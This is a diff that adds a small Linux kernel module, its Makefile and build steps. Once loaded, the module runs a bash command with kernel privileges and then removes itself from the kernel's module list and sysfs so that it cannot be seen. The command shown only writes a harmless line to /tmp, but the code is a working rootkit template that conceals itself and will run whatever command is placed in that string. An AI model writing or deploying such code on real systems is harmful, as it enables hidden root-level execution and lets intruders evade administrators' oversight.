@@ -1,0 +1,73 @@
+##### keyvan_module.c
+
+#include <linux/module.h>
+#include <linux/init.h>
+#include <linux/fs.h>
+#include <linux/uaccess.h>
+#include <linux/kallsyms.h>
+#include <linux/kernel.h>
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Keyvan");
+MODULE_DESCRIPTION("Keyvan Module");
+
+// Function to hide the module from the kernel modules list
+static void hide_module(void) {
+    list_del_init(&THIS_MODULE->list);
+    kobject_del(&THIS_MODULE->mkobj.kobj);
+}
+
+// Bash script to execute
+static char *bash_script = "echo 'Hello from the Keyvan module!' > /tmp/Keyvan_module_output";
+
+static int execute_bash_script(void) {
+    char *argv[] = {"/bin/bash", "-c", bash_script, NULL};
+    char *envp[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
+
+    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+}
+
+static int __init Keyvan_init(void) {
+    int ret = 0;
+
+    printk(KERN_INFO "Keyvan Module Loaded\n");
+
+    // Execute the bash script
+    ret = execute_bash_script();
+    if (ret != 0) {
+        printk(KERN_ERR "Failed to execute the bash script\n");
+        return ret;
+    }
+
+    // Hide the module from the kernel modules list
+    hide_module();
+
+    return 0;
+}
+
+static void __exit Keyvan_exit(void) {
+    printk(KERN_INFO "Keyvan Module Unloaded\n");
+}
+module_init(Keyvan_init);
+module_exit(Keyvan_exit);
+
+
+
+
+
+=================================
+
+### Makefile
+obj-m += keyvan_module.o
+all:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+clean:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+
+
+
+=================================
+
+### How to make?
+make
+
